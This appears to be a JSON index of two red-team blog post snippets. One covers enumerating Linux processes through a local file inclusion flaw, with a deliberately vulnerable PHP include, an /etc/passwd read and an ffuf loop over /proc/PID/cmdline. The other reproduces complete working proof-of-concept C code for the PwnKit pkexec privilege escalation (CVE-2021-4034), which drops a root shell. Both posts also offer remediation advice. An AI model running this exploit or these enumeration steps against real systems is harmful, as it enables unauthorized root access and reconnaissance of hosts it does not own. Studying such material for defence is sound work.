[ { "title": "Enumerating Linux Processes Through LFI", "url": "/posts/pidlfi/", "categories": "Linux, LFI, Enumeration, Web", "tags": "RedTeam, LFI, Web, Linux, Enumeration", "date": "2022-03-30 11:11:00 -0400", "snippet": "In this post, we’ll be exploring a technique to enumerate Linux processes through a web application vulnerable to LFI (Local File Inclusion).File inclusion vulnerabilities allow attackers to read arbitrary files from local or remote systems and include the contents of the files in the web server’s response.A Vulnerable Web AppWe’ll use a simple php script to simulate a vulnerable web application. As shown in the following code, the include statement is used to copy into the lfi.php page, the contents of the file passed to the lang variable:&amp;lt;?php if(isset($_GET[&#39;lang&#39;])){ include($_GET[&#39;lang&#39;]);} ?&amp;gt;The following image shows a request/response to our web application, using the vulnerable parameter lang to read the /etc/passwd file:The Proc File SystemOn Linux, the /proc directory contains one subdirectory for every process running on the system. These subdirectories are named after each process ID number (PID) that is active.Inside the PID subdirectories, we’ll find several files with information related to the running process. For example, to get the command-line arguments used to start a service, we can read the cmdline file inside the corresponding subdirectory. In the following image, 915 is the PID for the Apache server process:A full list of these files and it’s purpose can be found here.Enumerating PIDs with FfufWe’ll create list with the numbers from 1 to 5000, and fuzz the PIDs with ffuf. Since all requests returns a 200 status code, we’ll use the -fw 1 switch to filter responses with less than 2 words:for i in $(seq 1 5000); do echo $i &amp;gt;&amp;gt; pid.txt; done &amp;amp;&amp;amp; \\ffuf -c -w pid.txt:FUZZ -u http://10.0.0.19/lfi.php?lang=/proc/FUZZ/cmdline -fw 1Now we can read the cmdfile of any of the found PIDs. In the following example, we’ve discovered that on PID 4406, the user rgivens is running a bind shell on port 65534:Pythonizing the ProcessI’ve created a python script to automate the process and write the contents of the extracted PID files into an output file for offline review. You can download the script here.The parameters passed to the script are: URL The web application URL including the vulnerable parameter. Max PID Count The maximum number of PIDs to try starting from 1. Proc File Name of the file we want to read from inside the PID subdirectory. Output File Name of the output file. Here&#39;s a snippet replicating the attack with the Python script:RemediationWhen used properly, file inclusion is a feature and not a bug. But poor implementation turns it into a critical vulnerability. Some general recommendations developers can use to prevents LFI attacks include: Implement a Web Application Firewall (WAF). Never trust user input, and make sure to implement proper input validation against file inclusion. Implement whitelisting for file names and locations as well as blacklisting." }, { "title": "Polkit&#39;s Pkexec CVE-2021-4034", "url": "/posts/pwnkit/", "categories": "CVE, Linux", "tags": "RedTeam, LPE, CVE, Linux", "date": "2022-03-24 11:11:00 -0400", "snippet": "This post walks through the PoC and manual patching of the local privilege escalation vulnerability discovered in polkit’s pkexec, dubbed as PwnKit.Contents Exploit confirmed on fully patched Ubuntu 21.10 PoC Code Manual Patching CreditsExploit confirmed on fully patched Ubuntu 21.10:PoC Code:/* Compile: gcc polkit_PoC.c -o PwnKit* Change perms: chmod +x ./PwnKit* Profit: ./PwnKit*/#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;char *shell = &quot;#include &amp;lt;stdio.h&amp;gt;\\n&quot; &quot;#include &amp;lt;stdlib.h&amp;gt;\\n&quot; &quot;#include &amp;lt;unistd.h&amp;gt;\\n\\n&quot; &quot;void gconv() {}\\n&quot; &quot;void gconv_init() {\\n&quot; &quot; setuid(0); setgid(0);\\n&quot; &quot; seteuid(0); setegid(0);\\n&quot; &quot; system(\\&quot;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf &#39;GCONV_PATH=.&#39; &#39;pwnkit&#39;; /bin/sh\\&quot;);\\n&quot; &quot; exit(0);\\n&quot; &quot;}&quot;;int main(int argc, char *argv[]) { FILE *fp; system(&quot;mkdir -p &#39;GCONV_PATH=.&#39;; touch &#39;GCONV_PATH=./pwnkit&#39;; chmod a+x &#39;GCONV_PATH=./pwnkit&#39;&quot;); system(&quot;mkdir -p pwnkit; echo &#39;module UTF-8// PWNKIT// pwnkit 2&#39; &amp;gt; pwnkit/gconv-modules&quot;); fp = fopen(&quot;pwnkit/pwnkit.c&quot;, &quot;w&quot;); fprintf(fp, &quot;%s&quot;, shell); fclose(fp); system(&quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&quot;); char *env[] = { &quot;pwnkit&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;CHARSET=PWNKIT&quot;, &quot;SHELL=pwnkit&quot;, NULL }; execve(&quot;/usr/bin/pkexec&quot;, (char*[]){NULL}, env);}Manual Patching:Remove SGID from /usr/bin/pkexeccd /usr/bin &amp;amp;&amp;amp; sudo chmod 0755 ./pkexecCredits:This vulnerability was discovered by the Qualys Research Team." } ]
